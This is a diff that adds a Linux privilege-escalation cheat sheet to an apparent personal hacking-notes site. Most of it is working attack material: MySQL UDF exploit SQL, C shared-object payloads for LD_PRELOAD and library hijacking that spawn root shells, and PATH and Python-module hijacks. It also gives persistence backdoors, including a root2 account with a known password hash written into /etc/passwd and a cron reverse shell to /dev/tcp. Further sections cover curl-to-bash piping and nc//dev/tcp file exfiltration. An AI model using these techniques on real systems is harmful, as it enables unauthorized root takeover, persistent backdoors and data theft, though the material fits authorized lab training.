@@ -1,0 +1,884 @@
+---
+layout: default
+---
+<html>
+
+<head>
+    <title>Linux PrivEsc</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<hr>
+
+<body>
+
+    <h1>Linux PrivEsc</h1>
+
+    <hr>
+
+    <h2>PrivEsc Strategy</h2>
+
+    <li>Kernel Exploits</li>
+    <ul>
+        <li>searchsploit &lt;kernel version&gt;</li>
+        <li>If you think an exploit should work but it is not, then look up the CVE for the exploit and google it to
+            search for others.</li>
+    </ul>
+
+    <li>Check user id and groups</li>
+    <ul>
+        <li>id</li>
+        <li>Google exploits for groups</li>
+    </ul>
+
+    <li>Password attacks</li>
+    <ul>
+        <li>Password reuse</li>
+        <li>Guess passwords</li>
+        <li>Try to authenticate as other users:</li>
+        <ul>
+            <li>SSH</li>
+            <li>su &lt;user&gt;</li>
+        </ul>
+    </ul>
+
+    <li>Run linpeas</li>
+    <ul>
+        <li>Rerun as new user if a new on is accessed</li>
+        <li>If there is trouble downloading and running the script try piping to bash: curl &lt;url to kali
+            machine/linpeas.sh&gt; | bash</li>
+        <ul>
+            <li>This method also avoids using the victim's disk</li>
+        </ul>
+    </ul>
+    <li>Look for sensitive files/information</li>
+    <ul>
+        <li>Locations that may contain passwords</li>
+        <ul>
+            <li>Recursively search directories for files that contain the word password</li>
+            <li>Home directory</li>
+            <li>History files</li>
+            <li>Config files</li>
+            <ul>
+                <li>Web server files</li>
+            </ul>
+            <li>Log files</li>
+            <ul>
+                <li>/var/log</li>
+            </ul>
+        </ul>
+        <li>Look for private SSH keys</li>
+        <li>Check website configurations</li>
+        <ul>
+            <li>/etc/apache2/sites-enabled</li>
+        </ul>
+    </ul>
+
+    <li>Look for running programs</li>
+    <ul>
+        <li>ps aux</li>
+        <li>Look for programs being running as root, see if exploitable</li>
+        <li>Enumerate versions, look for vulnerable/exploitable ones</li>
+        <ul>
+            <li>If there is trouble enumerating versions, try googling the md5sum of the program</li>
+        </ul>
+    </ul>
+
+    <li>Network traffic</li>
+    <ul>
+        <li>Listen for traffic on localhost</li>
+        <ul>
+            <li>use tcpdump</li>
+            <li>Might find credentials being passed over the network</li>
+        </ul>
+    </ul>
+
+    <li>mysql</li>
+    <ul>
+        <li>If we can log in to it, look for sensitive information</li>
+        <li>UDF Exploit - Run commands as the user (preferably root) that is logged into mysql</li>
+        <ul>
+            <li>Place a UDF exploit shared object in the mysql plugins directory</li>
+            <ul>
+                <li>Get plugins directory:
+                    <pre>SHOW VARIABLES LIKE &apos;plugin_dir&apos;;</pre>
+                <li>Exploit</li>
+                    <pre>use mysql;&#13;&#10;create table foo(line blob);&#13;&#10;insert into foo values(load_file(&apos;&lt;udf exploit shared object&gt;&apos;));&#13;&#10;select * from foo into dumpfile &apos;&lt;sql plugin directory&gt;/&lt;udf explit shared object&gt;&apos;;&#13;&#10;create function sys_exec returns integer soname &apos;&lt;udf explit shared object&gt;&apos;;&#13;&#10;select * from mysql.func;&#13;&#10;select &lt;shared object library symbol/function&gt;(&apos;&lt;command&gt;&apos;)</pre>
+                </li>
+                <li>UDF Exploit Shared Objects</li>
+                <ul>
+                    <li>raptor_udf</li>
+                    <ul>
+                        <li>Exploit function: do_system(&apos;&lt;command&gt;&apos;)</li>
+                    </ul>
+                    <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so</li>
+                    <ul>
+                        <li>Exploit function: sys_exec(&apos;&lt;command&gt;&apos;)</li>
+                    </ul>
+                    <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so</li>
+                    <ul>
+                        <li>Exploit function: sys_exec(&apos;&lt;command&gt;&apos;)</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>If web page is running under the context of higher privilege user, try to create a web shell</li>
+
+    <li>Check network services</li>
+    <ul>
+        <li>Look for open ports/running services that didn't show during port scan</li>
+        <ul>
+            <li>netstat -tulpn</li>
+            <li>Forward internally listening ports to attacking machine</li>
+        </ul>
+        <li>Check for port knocking configurations</li>
+        <li>/etc/knockd.conf</li>
+    </ul>
+
+    <li>Check for interesting programs</li>
+    <ul>
+        <li>PATH locations</li>
+        <li>dpkg -l</li>
+        <li>/var</li>
+        <li>/opt</li>
+        <li>/usr/local/src</li>
+        <li>/usr/src</li>
+        <li>Check programs for extended capabilities</li>
+        <ul>
+            <li>getcap &lt;file&gt;</li>
+            <ul>
+                <li>=en means root permissions. As good as sudo</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Look for unmounted file systems</li>
+    <li>SUID/GUID files</li>
+    <ul>
+        <li>Check GTFOBins</li>
+        <li>Analyze file to see if commands it is calling is using absolute paths</li>
+        <ul>
+            <li>strace</li>
+        </ul>
+    </ul>
+
+    <li>File permissions</li>
+
+    <li>Sudo</li>
+    <ul>
+        <li>Check sudo permissions</li>
+        <ul>
+            <li>sudo -l</li>
+            <li>Check sudo commands against GTFOBins</li>
+            <li>If sudo command shows (<another user>) in front of the command this means we are able to execute the
+                    command as another user</li>
+            <ul>
+                <li>Execute sudo command as another user: sudo -u &lt;username&gt; &lt;sudo command&gt;</li>
+            </ul>
+        </ul>
+        <li>Environment Variables</li>
+        <ul>
+            <li>Check with sudo -l</li>
+            <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others
+                while running sudo</li>
+            <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+        </ul>
+    </ul>
+    </ul>
+
+    <li>Cron Jobs</li>
+    <ul>
+        <li>Check cron PATH, see if we have write access to any directories.</li>
+        <li>Check if we can write to file that crontab is running</li>
+        <ul>
+            <li>If so, change file to execute malicious command</li>
+        </ul>
+        <ul>
+            <li>Check if absolute paths are *not* being used</li>
+            <ul>
+                <li>If so, try to create a malicious executable in PATH preceding PATH directory of the executable that
+                    is currently being used</li>
+            </ul>
+        </ul>
+        <li>Check commands using wildcards *</li>
+        <ul>
+            <li>If so, create a file in the directory that the wildcard is being ran on. Name this file as the malicious
+                command line options you would like to use against this program. Check GTFOBins to determine which flags
+                to use.</li>
+        </ul>
+    </ul>
+
+    <li>systemd timers</li>
+    <ul>
+        <li>New way to do cronjob on services</li>
+        <li>systemctl list-timers</li>
+    </ul>
+    <li>Check for processes running in the background</li>
+    <ul>
+        <li>pspy</li>
+    </ul>
+
+    <hr>
+
+    <h2>Manual Enumeration</h2>
+
+    <li>User info</li>
+    <table>
+        <tr>
+            <td>Current user</td>
+            <td>
+                <li>whoami</li>
+                <li>who</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Currently logged in users</td>
+            <td>W</td>
+        </tr>
+        <tr>
+            <td>Current permissions</td>
+            <td>id</td>
+        </tr>
+        <tr>
+            <td>User list</td>
+            <td>/etc/passwd</td>
+        </tr>
+        <tr>
+            <td>Groups</td>
+            <td>/etc/group</td>
+        </tr>
+    </table>
+
+    <li>Operating System & Kernel</li>
+
+    <table>
+        <tr>
+            <td>Show host</td>
+            <td>hostname</td>
+        </tr>
+        <tr>
+            <td>Distribution type & version</td>
+            <td>
+                <li>/etc/issue</li>
+                <li>/etc/*-release</li>
+                <li>/etc/lsb-release #debian</li>
+                <li>/etc/redhat-released #redhat</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Kernel version</td>
+            <td>
+                <li>/proc/version</li>
+                <li>uname -a</li>
+                <li>uname -r</li>
+                <li>uname -mrs</li>
+                <li>rpm -q kernel</li>
+                <li>dmesg | grep linux</li>
+                <li>ls /boot | grep vmlinuz-</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Kernel modules</td>
+            <td>lsmod</td>
+        </tr>
+        <tr>
+            <td>More info on specific kernel module</td>
+            <td>/sbin/modinfo &lt;kernel module&gt;</td>
+        </tr>
+        <tr>
+            <td>System architecture</td>
+            <td>arch</td>
+        </tr>
+        <tr>
+            <td>Environment Variables</td>
+            <td>
+                <li>/etc/profile</li>
+                <li>/etc/bashrc</li>
+            </td>
+        </tr>
+        <tr></tr>
+    </table>
+
+    <li>Network</li>
+
+    <table>
+        <tr>
+            <td>Network interfaces and addresses</td>
+            <td>/proc/net/fib_trie</td>
+        </tr>
+        <tr>
+            <td>Listening ports (HEX encoded)</td>
+            <td>
+                /proc/net/tcp
+                <li>cat /proc/net/tcp | grep '00000000:0000 0A' </li>
+                <ul>
+                    <li>0A = listening</li>
+                    <li>0100007F:15E1 = 127.0.0.1:5701</li>
+                </ul>
+            </td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>File transfer</h2>
+
+    <li>Download to Linux</li>
+    <table>
+        <tr>
+            <td>wget</td>
+            <td>wget &lt;url&gt; -o &lt;Output File&gt;</td>
+        </tr>
+        <tr>
+            <td>curl</td>
+            <td>curl &lt;url&gt; -O &lt;Output File&gt;</td>
+        </tr>
+        <tr>
+            <td>Base64</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Base64 Encrypt File</td>
+                        <td>base64 &lt;file&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Decode Base64 and Recreate File</td>
+                        <td>base64 -d &lt;file w/ base64 text&gt; &gt; file</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>socat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>socat TCP4-LISTEN:&lt;port #&gt;,fork file:&lt;File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>socat TCP4:&lt;ip address&gt;:&lt;port #&gt; file:&lt;File&gt;,create</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>netcat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>nc &lt;ip address&gt; &lt;port #&gt; &lt; &lt;Upload File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>nc -lvnp &lt;ip address&gt; &lt;port #&gt; &gt; &lt;Download File&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>scp</td>
+            <td>scp &lt;user&gt;@&lt;ip address&gt;:&lt;file&gt; &lt;Directory to Download to&gt;</td>
+        </tr>
+    </table>
+
+    <li>Upload to Linux</li>
+    <table>
+        <tr>
+            <td>Base64</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Base64 Encrypt File</td>
+                        <td>base64 &lt;file&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Decode Base64 and Recreate File</td>
+                        <td>base64 -d &lt;file w/ base64 text&gt; &gt; file</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>socat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload</td>
+                        <td>socat TCP4-LISTEN:&lt;port #&gt;,fork file:&lt;File&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download</td>
+                        <td>socat TCP4:&lt;ip address&gt;:&lt;port #&gt; file:&lt;File&gt;,create</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>/dev/tcp</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Upload file</td>
+                        <td>cat &lt;file&gt; &gt; /dev/tcp/&lt;ip address&gt;/&lt;port&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Download File</td>
+                        <td>nc -lvnp &lt;port&gt; &gt; &lt;Output File&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>scp</td>
+            <td>scp &lt;file to upload&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;Directory to upload to&gt;</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>Shell Upgrade and Escapes</h2>
+
+    <li>Upgrade</li>
+    <table>
+        <tr>
+            <td>Enable tab and autocompletion</td>
+            <td>
+                <li>Send victim shell to background with ctrl+z</li>
+                <li>Command: stty raw -echo;fg;</li>
+                <li>Bring process back with fg</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Format shell size if formatting is bad</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Check rows # and columns # on kali box, in a pane the same size as the victim shell.</td>
+                        <td>stty -a</td>
+                    </tr>
+                    <tr>
+                        <td>Victim shell</td>
+                        <td>stty rows &lt;#&gt; cols &lt;#&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>TTY Upgrade</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Check for TTY</td>
+                        <td>
+                            <li>tty</li>
+                            <li>sudo -i</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Python</td>
+                        <td>python -c "import pty;pty.spawn('/bin/bash');"</td>
+                    </tr>
+                    <tr>
+                        <td>Python3</td>
+                        <td>python3 -c "import pty;pty.spawn('/bin/bash');"</td>
+                    </tr>
+                    <tr>
+                        <td>script command</td>
+                        <td>script /dev/null -c bash</td>
+                    </tr>
+                    <tr>
+                        <td>Perl</td>
+                        <td>perl -e 'exec "/bin/sh";'</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Enable "clear" command</td>
+            <td>export TERM=xterm</td>
+        </tr>
+        <tr>
+            <td>Setting PATH variable</td>
+            <td>export
+                PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:
+            </td>
+        </tr>
+        <tr>
+            <td>Break out of rbash</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>ssh &lt;username&gt;@&lt;ip address&gt; -t "bash --noprofile"</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>ed<br>!'/bin/bash'</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Break out of python shell</td>
+            <td>import os<br>os.system("bash");</td>
+        </tr>
+    </table>
+
+    <li><a id="ssh">Setup an SSH Shell</a></li>
+    <ul>
+        <li>An SSH shell will not always be possible. SSH is frequently, but not always, configured to not allow SSH
+            shells for certain users.</li>
+        <li>Create an SSH key</li>
+        <ul>
+            <li>run: ssh-keygen</li>
+            <ul>
+                <li>When it prompts for a password just push enter</li>
+                <li>This will generate a public and a private key</li>
+                <li>The contents of the public key must be in a file call "authorized_keys" in a folder called .ssh in
+                    the users home directory.</li>
+                <ul>
+                    <li>/home/&lt;user we have access to&gt;/.ssh/authorized_keys</li>
+                </ul>
+                <li>The contents of the private key must be on our machine in a file with permissions set to 600</li>
+                <ul>
+                    <li>The private key file can be named anything</li>
+                    <li>chmod 600 &lt;private key file&gt;</li>
+                </ul>
+            </ul>
+        </ul>
+        <li>Connect via ssh</li>
+        <ul>
+            <li>ssh &lt;user&gt;@&lt;victim ip&gt; -i &lt;private key file&gt;</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Auto Enumeration Tools</h2>
+
+    <li>Kernel exploits</li>
+    <ul>
+        <li>Kernel exploits tool</li>
+        <ul>
+            <li>Linux Exploit Suggester Script</li>
+        </ul>
+    </ul>
+
+    <li>PrivEsc Tools</li>
+    <ul>
+        <li>linpeas</li>
+        <li>pspy</li>
+        <li>http://pentestmonkey.net/tools/audit/unix-privesc-check</li>
+        <li>http://labs.portcullis.co.uk/application/enum4linux/</li>
+        <li>Linux smart enumeration</li>
+        <li>LinEnum</li>
+        <li>https://github.com/AlessandroZ/BeRoot</li>
+        <li>https://github.com/linted/linuxprivchecker</li>
+        <li>suid3num</li>
+    </ul>
+
+    <hr>
+
+    <h2>Sudo Environment Variables</h2>
+
+    <li>Sudo version</li>
+    <li>Environment Variables</li>
+    <ul>
+        <li>sudo -l to view configured environment options</li>
+        <li>LD_PRELOAD</li>
+        <ul>
+            <li>If LD_PRELOAD is set it will load whatever shared object is set before anything else.</li>
+            <ul>
+                <li>Create malicious shared object</li>
+                <pre>&#13;&#10;#include &lt;stdio.h&gt;&#13;&#10;#include &lt;sys/types.h&gt;&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;void _init() {&#13;&#10;    unsetenv(&quot;LD_PRELOAD&quot;);&#13;&#10;    setresuid(0,0,0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;&#13;&#10;#gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c&#13;&#10;                </pre>
+            </ul>
+            <li>Run any sudo enabled command:</li>
+            <ul>
+                <li>sudo LD_PRELOAD=/tmp/preload.so &lt;sudo command&gt;</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>LD_LIBRARY_PATH</li>
+    <ul>
+        <li>LD_LIBRARY_PATH is an environment variable that contains the directories where shared libraries are searched
+            for first.</li>
+        <ul>
+            <li>ldd command will show the shared objects used by a program</li>
+        </ul>
+        <li>Create a new shared object with the same name as the one used by the program</li>
+        <ul>
+            <li>Set the LD_LIBRARY_PATH to its directory to get the program to execute the new shared object instead.
+            </li>
+            <li>Example:</li>
+            <ul>
+                <li>ldd /usr/bin/apache2</li>
+                <li>Output: shared objects, choose one to replace</li>
+                <li>Create a file to compile that will replace the original shared object </li>
+                <pre>&#13;&#10;#include &lt;stdio.h&gt;&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;static void hijack() __attribute__((constructor));&#13;&#10;void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);&#13;&#10;    setresuid(0,0,0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;&#13;&#10;#gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  &#13;&#10;                </pre>
+                <li>run command</li>
+                <ul>
+                    <li>sudo LD_LIBRARY_PATH=&lt;Malicious .so directory&gt; &lt;sudo command&gt;</li>
+                    <li>Rooted</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>NFS</h2>
+
+    <table>
+        <tr>
+            <td>Show the NFS server’s export list</td>
+            <td>showmount -e &lt;target&gt;</td>
+        </tr>
+        <tr>
+            <td>Show NFS shares with nmap</td>
+            <td>nmap –sV –script=nfs-showmount &lt;target&gt;</td>
+        </tr>
+        <tr>
+            <td>Mount an NFS share</td>
+            <td>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</td>
+        </tr>
+    </table>
+
+    <li>NFS share information is stored in /etc/exports</li>
+    <li>Root Squashing</li>
+    <ul>
+        <li>When connecting to an NFS share, if root squashing is enabled, then the owner of the files in the share will
+            be set to "nobody".</li>
+        <ul>
+            <li>On victim machine:</li>
+            <ul>
+                <li>Check /etc/exports to see if no_root_squash is listed. If so, root squashing is disabled.</li>
+            </ul>
+            <li>On attack machine:</li>
+            <ul>
+                <li>Confirm NFS share is available for remote mounting</li>
+                <ul>
+                    <li>showmount -e &lt;target ip&gt;</li>
+                </ul>
+                <li>mkdir /tmp/nfs</li>
+                <li>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; /tmp/nfs</li>
+                <li>sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</li>
+                <li>chmod +xs /tmp/nfs/shell.elf</li>
+            </ul>
+            <li>On victim machine</li>
+            <ul>
+                <li>Execute payload</li>
+                <ul>
+                    <li>/tmp/shell.elf</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>SUID and GUID executables</h2>
+
+    <table>
+        <tr>
+            <td>Find files with guid or suid set</td>
+            <td>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null</td>
+        </tr>
+        <tr>
+            <td>See which commands/executables a file is trying to run</td>
+            <td>strings &lt;program&gt;</td>
+        </tr>
+        <tr>
+            <td>Confirm which executable/command a program is trying to run</td>
+            <td>
+                <li>strace -v -f -e execve &lt;program&gt; 2>&1 | grep executable/command</li>
+                <li>ltrace &lt;program&gt;</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Check file for missing shared objects</td>
+            <td>ld &lt;executable&gt;</td>
+        </tr>
+        <tr>
+            <td>Update cache to include new shared objects</td>
+            <td>ldconfig</td>
+        </tr>
+    </table>
+
+    <li>Check GTFOBins for flags to use in order to execute malicious commands</li>
+    <li>Binary being called is not absolute (scp vs /usr/bin/scp)</li>
+    <li>Shared object not found</li>
+    <ul>
+        <li>Vulnerability to shared object injection</li>
+        <ul>
+            <li>Find shared objects that are not found by the executable</li>
+            <li>Create a shared object in the directory where the shared object is being searched for</li>
+            <pre>#define _GNU_SOURCE&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;#include &lt;unistd.h&gt;&#13;&#10;&#13;&#10;int main(void) {&#13;&#10;    setresuid(0, 0, 0);&#13;&#10;    system(&quot;/bin/bash&quot;);&#13;&#10;}</pre>
+            <li>gcc: error trying to exec 'cc1': execvp: No such file or directory</li>
+            <ul>
+                <li>Check environment variables to make sure PATH has been set</li>
+                <ul>
+                    <li>export</li>
+                </ul>
+                <li>If PATH has not been set, then set it</li>
+                <ul>
+                    <li>export PATH</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>File calls for executable without absolute path</li>
+    <ul>
+        <li>We can add a malicious version of the executable to our PATH.</li>
+        <li>Create a malicious executable with the same name as the program that is being called without an absolute
+            path</li>
+        <pre>&#13;&#10;int main() {&#13;&#10;    setuid(0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;#gcc -o &lt;file&gt; &lt;file.c&gt;&#13;&#10;        </pre>
+        <li>PATH=.:$PATH</li>
+        <li>Execute vulnerable SUID/GUID</li>
+        <li>Rooted</li>
+    </ul>
+
+    <li>Calls for executable w/ absolute path and bash < 4.2-048</li>
+            <ul>
+                <li>function &lt;exectuable being called&gt; { /bin/bash -p; }</li>
+                <li>export -f &lt;exectuable being called&gt;</li>
+                <li>execute vulnerable suid/guid file</li>
+                <li>Rooted</li>
+            </ul>
+
+            <hr>
+
+            <h2>Persistence Methods</h2>
+            <table>
+                <tr>
+                    <td>Add new root to /etc/passwd</td>
+                    <td>
+    <li>echo &quot;root2:&lt;hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
+    <table>
+        <tr>
+            <td>Generate new password hash</td>
+            <td>openssl passwd &lt;password&gt;</td>
+        </tr>
+    </table>
+    <li>echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
+    <ul>
+        <li>password = root</li>
+    </ul>
+    <li>su root2</li>
+    </td>
+    </tr>
+    <tr>
+        <td>Add user to /etc/sudoers</td>
+        <td>echo &quot;&lt;user&gt; ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</td>
+    </tr>
+    <tr>
+        <td>SUID Bash</td>
+        <td>
+            <li>cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash</li>
+            <li>./rootbash -p</li>
+        </td>
+    </tr>
+    <tr>
+        <td>Malicious Cronjob</td>
+        <td>echo &quot;* * * * * root /bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port #&gt;
+            0&gt;&amp;1&#039; &quot;</td>
+    </tr>
+    </table>
+
+    <hr>
+
+    <h2>Groups</h2>
+
+    <li>Video</li>
+    <ul>
+        <li>The video group gives us access to screen output</li>
+        <ul>
+            <li>Privesc usage example: If a user has a credential showing on their screen we can look at the screen
+                image and view the credential.</li>
+        </ul>
+        <li>How to view screen output</li>
+        <ul>
+            <table>
+                <tr>
+                    <td>Capture the raw image data of current screen output</td>
+                    <td>cat /dev/fb0 > /tmp/screen.raw</td>
+                </tr>
+                <tr>
+                    <td>Get the screen output image resolution size</td>
+                    <td>cat /sys/class/graphics/fb0/virtual_size</td>
+                </tr>
+            </table>
+            <li>Open screen.raw using gimp. File &gt; Open... &gt; Select File Type: Raw image data &gt; (check) Show
+                All Files Files &gt; (click on/open) screen.raw</li>
+            <li>Set width and height to what is shown in /sys/class/graphics/fb0/virtual_size</li>
+            <li>Change "Image Type:" until a clear image is shown.</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Malicious Python Module</h2>
+
+    <li>If a script is being ran by root and we have write permissions to a module that the script is importing then we
+        can get root command execution by modifying the module being imported.</li>
+
+    <table>
+        <tr>
+            <td>
+                <li>Vulnerable script(s) on victim machine</li>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>
+                            <li>admin_tasks.py</li>
+                            <ul>
+                                <li>Calls backup.py</li>
+                            </ul>
+                        </td>
+                        <td>
+                            <pre>(Removed irrelevant code)&#13;&#10;&quot;&mldr;.then&#13;&#10;        echo &apos;Running backup script in the background, it might take a while&mldr;&apos;&#13;&#10;        /opt/scripts/backup.py &amp;&mldr;..&quot;&#13;&#10;        (Removed irrelevant code)</pre>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <li>backup.py</li>
+                            <ul>
+                                <li>imports shutil.py and execute make_archive with 3 arguments</li>
+                            </ul>
+                        </td>
+                        <td>
+                            <pre>#!/usr/bin/python3&#13;&#10;    (Removed irrelevant code)&#13;&#10;from shutil import make_archive&#13;&#10;   (Removed irrelevant code)&#13;&#10;&mldr;make_archive(dst, &apos;gztar&apos;, src)&#13;&#10;   (Removed irrelevant code)</pre>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Create malicious module - shutil.py</td>
+            <td>
+                <pre>import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;&lt;malicious payload&gt;</pre>
+            </td>
+        </tr>
+        <tr>
+            <td>Malicious payloads</td>
+            <td>
+
+                <li>Spawn root shell</li>
+                <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
+                <li>Execute malicious bash command</li>
+                <pre>import os&#13;&#10;&#13;&#10;os.system(&quot;&lt;malicious bash command&gt;&quot;);</pre>
+
+            </td>
+        </tr>
+    </table>
+
+</body>
+
+</html>
